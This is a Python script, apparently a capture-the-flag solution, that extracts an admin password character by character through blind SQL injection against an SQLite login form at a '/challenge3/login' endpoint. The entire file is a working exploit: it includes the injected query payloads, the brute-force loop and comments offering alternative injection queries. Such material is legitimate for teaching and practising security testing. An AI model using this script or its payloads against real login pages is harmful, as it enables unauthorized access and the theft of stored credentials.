#!/usr/bin/python3
import sys
import requests
import string

def send_p(url, query):
    proxies = {
        "http": "http://127.0.0.1:8080"
    }
    payload = {"username": query, "password": "admin"}
    r = requests.post(url, data=payload, timeout=1, proxies=proxies)
    return r.text


def main(addr):

    # limit 1 offset 0 = select 1 row from column and remove 0 from them
    # substr(password,2,1) = start from second char
    # and (select hex(substr(password,1,1)) from users limit 1 offset 0) > hex('k')
    # ref: https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf
    url = f"http://{addr}/challenge3/login"
    flag = ""

    # Not the most efficient way of doing it...
    # Find length of password:
    # admin' AND length((SELECT password from users where username='admin'))==37--
    for i in range(1,37):
        for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}":
            # SQLite is case-sensitive on the hex value, if the application does  something like
            # .lower() before using the input, then the query below with hex() won't work
            # query = f"admin' and (SELECT hex(substr(password,{i},1)) from users limit 1 offset 0) = hex('{c}')--"
            
            # Convert char to hex and remove "0x"
            h = hex(ord(c))[2:]
            query = "admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1)," \
                f"{i},1)=CAST(X'{h}' AS TEXT)--"
            resp = send_p(url, query)
            if not "Invalid" in resp:
                flag += c
                print(flag)
    print(f"[+] FLAG: {flag}")

if __name__ == "__main__":
    main(sys.argv[1])

